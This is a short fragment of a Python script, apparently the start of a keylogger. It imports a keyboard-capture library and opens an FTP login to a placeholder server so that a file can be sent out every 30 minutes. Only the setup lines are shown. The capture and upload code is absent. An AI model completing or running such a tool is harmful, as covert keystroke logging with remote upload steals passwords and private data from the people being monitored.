# import libraries
import keyboard
from ftplib import FTP
import datetime

# FTP Configurations
send_file_every = 1800  # This is the time in seconds, can be changed
ftp = FTP('server.ip')
ftp.login(user='username', passwd='123')


